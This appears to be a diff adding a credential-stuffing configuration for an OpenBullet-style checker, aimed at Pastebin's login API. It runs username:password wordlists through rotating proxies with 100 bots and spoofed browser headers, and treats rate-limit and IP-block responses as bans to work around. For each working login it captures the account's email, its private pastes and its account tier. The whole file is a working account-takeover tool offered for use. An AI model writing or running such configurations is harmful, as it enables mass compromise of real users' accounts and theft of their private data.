@@ -1,0 +1,65 @@
+[SETTINGS]
+{
+  "Name": "PastebinAPI",
+  "SuggestedBots": 100,
+  "LastModified": "2018-08-08T09:57:14.4478279+00:00",
+  "AdditionalInfo": "Word of warning for you guys, this config fucking EATS proxies.",
+  "Author": "Mew",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://pastebin.com/api/api_login.php" AutoRedirect=TRUE 
+  CONTENT "api_user_name=<USER>&api_user_password=<PASS>&api_dev_key=2e58ce27239e34a77c5ef65dbea8b24d" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER ":scheme: https" 
+  HEADER ":path: /api/api_login.php" 
+  HEADER ":method: POST" 
+  HEADER ":authority: pastebin.com" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+  HEADER "origin: chrome-extension://ghipmampnddcpdlppkkamoankmkmcbmh" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "invalid login" 
+  KEYCHAIN Ban OR 
+    KEY "too many logins" 
+    KEY "Pastebin.com has blocked your IP" 
+    KEY "Access Denied" 
+PARSE "<SOURCE>" LR "" "" Recursive=FALSE -> VAR "KEY" "" "" 
+REQUEST POST "https://pastebin.com/api/api_post.php" AutoRedirect=TRUE 
+  CONTENT "api_dev_key=2e58ce27239e34a77c5ef65dbea8b24d&api_user_key=<KEY>&api_option=userdetails" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" LR "<user_email>" "<" Recursive=FALSE -> CAP "Email" "" "" 
+PARSE "<SOURCE>" LR "<user_private>" "<" Recursive=FALSE -> CAP "Private Pastes" "" "" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "<user_name>" 
+  KEYCHAIN Ban OR 
+    KEY "Pastebin.com has blocked your IP" 
+    KEY "Access Denied" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "account_type>0" 
+  KEYCHAIN Ban OR 
+    KEY "Pastebin.com has blocked your IP" 
+    KEY "Access Denied" 
